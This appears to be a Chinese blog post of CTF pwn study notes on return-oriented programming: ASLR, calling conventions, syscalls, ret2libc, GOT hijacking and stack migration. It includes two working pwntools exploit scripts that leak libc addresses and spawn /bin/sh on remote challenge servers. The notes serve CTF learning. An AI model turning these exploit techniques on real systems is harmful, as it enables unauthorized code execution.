---
title: PWN从入门到出入平安（二）——ROP
date: 2023-05-13 21:44:16
tags:
- CTF
- PWN
categories:
- CS
excerpt: "ROP基础,ret2syscall,stack migration"
---

# Base

Linux下的ASLR总共有3个级别，0、1、2

- 0就是关闭ASLR，没有随机化，堆栈基地址每次都相同，而且libc.so每次的地址也相同。
- 1是普通的ASLR。mmap基地址、栈基地址、.so加载基地址都将被随机化，但是堆没用随机化

2是增强的ASLR，增加了堆随机化

## 传参

#### 64位

rdi，rsi， rdx， rcx， r8， r9

参数为7个以上，后面以此从右往左放入栈中

## 函数原型

```c
read()：
  ssize_t read(int fd,const void *buf,size_t nbytes); 
  //fd 为要读取的文件的描述符  0
  //buf 为要读取的数据的缓冲区地址 
  //nbytes 为要读取的数据的字节数

  //read() 函数会从 fd 文件中读取 nbytes 个字节并保存到缓冲区 buf，
 //成功则返回读取到的字节数（但遇到文件结尾则返回0），失败则返回 -1。

write() 
  ssize_t write(int fd,const void *buf,size_t nbytes);
  //fd 为要写入的文件的描述符  1 
  //buf 为要写入的数据的缓冲区地址
  //nbytes 为要写入的数据的字节数 

 //write() 函数会将缓冲区 buf 中的 nbytes 个字节写入文件 fd，
 //成功则返回写入的字节数，失败则返回 -1。
printf一直输出到\x00
```

## gadget

* read/rewrite register/memory
  * `pop eax	ret`
  * `mov [eax],ebx	ret`
* system call
* change esp

### 栈溢出基础

[https://zhuanlan.zhihu.com/p/25816426]:写的好啊

# ret2syscall

#### X86

**调用方式：**`int 0x80` 中断进行系统调用

**传参方式：**首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器

**调用号：**`sys_read` 的调用号 为 3，`sys_write` 的调用号 为 4，`sys_execve`的调用号为11*(0xB)*

#### amd

**调用方式：**`syscall`进行系统调用

**传参方式：**首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器

**调用号：**`sys_read` 的调用号 为 0， `sys_write` 的调用号 为 1，`stub_execve` 的调用号 为 59*(0x3B)*，`stub_rt_sigreturn`的调用号 为 15



`execve`函数作用是执行一个新的程序，程序可以是二进制的可执行程序，也可以是shell、pathon脚本

`execve("/bin/sh",NULL,NULL)`可分两次写入`/bin`和`/sh\x00`

​	

# ret2libc


```python
from pwn import*
context.log_level = 'debug'
#p = process("./pwn4")
p = remote("node5.anna.nssctf.cn",28240)
#gdb.attach(p)

elf=ELF("./pwn4")
libc=ELF("libc-2.31.so")
rdi_ret=0x00000000004007d3
ret=0x0000000000400556

payload = 0x68*b'\x00'+p64(rdi_ret)     
payload += p64(elf.got['read'])+p64(elf.plt['puts'])
payload += p64(elf.symbols['_start'])
p.sendline(payload)

libc_base = u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-libc.symbols['read']
sys = libc_base+libc.symbols['system']
binsh = libc_base+next(libc.search(b"/bin/sh"))    

print(hex(sys))

payload = 0x68*b'\x00' + p64(rdi_ret)+p64(binsh)+p64(ret)+p64(sys)
p.sendline(payload)

p.interactive()
```

# got hijacking

把got表地址覆盖为目标函数的地址

# stack migration

[https://www.cnblogs.com/max1z/p/15299000.html#%E6%A0%88%E8%BF%81%E7%A7%BB]:写的好啊

[写的比我好]:https://www.cnblogs.com/max1z/p/15299000.html#%E6%A0%88%E8%BF%81%E7%A7%BB

## 原理

**call func:**

```assembly
push eip+4
push ebp
mov ebp esp
```

**leave:**

```assembly
mov esp ebp
pop ebp
```

**ret:**

```assembly
pop eip
```



## 例

### payload

```python
#!/usr/bin/env python
from pwn import*

context(os = 'linux', arch = 'i386', log_level = 'debug')
def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(p, cmd)
	pause()

host = "node4.buuoj.cn"
port = 28566
#p = process("./ciscn_2019_es_2")
p = remote(host,  port)
elf =ELF("./ciscn_2019_es_2")

hack_addr = 0x0804854B
leave_ret_addr = 0x080484b8
echoflag_addr = 0x080486c0
vul_addr = 0x08048595
sys_addr = elf.plt['system']

#debug()

p.recvuntil("name?\n")
pl = cyclic(39)
p.sendline(pl)
p.recvuntil("\n")
ebp = u32(p.recvn(4))-0x10
print(hex(ebp))

pl = flat([b"aaaa",sys_addr, b"bbbb",ebp-0x28+16,b"/bin/sh\x00"])
pl += cyclic(16)
pl += flat([ebp-0x28, leave_ret_addr])
p.send(pl)

p.interactive()

```

> 这里解释一下，为什么会有4个字节空余的部分。
> 这里的部分，在正常调用system函数的时候，堆栈位置的system_plt之后的内容为system函数的返回地址，在之后才是新的堆栈的栈顶位置，因此在system_plt和sh_addr之间增加了4个字符来进行填充。

## 其他gadgets

```assembly
add esp,0xNN;ret
sub esp,0xNN;ret
ret 0xNN
xchg esp,exx;ret
partial overwrite ebp
```

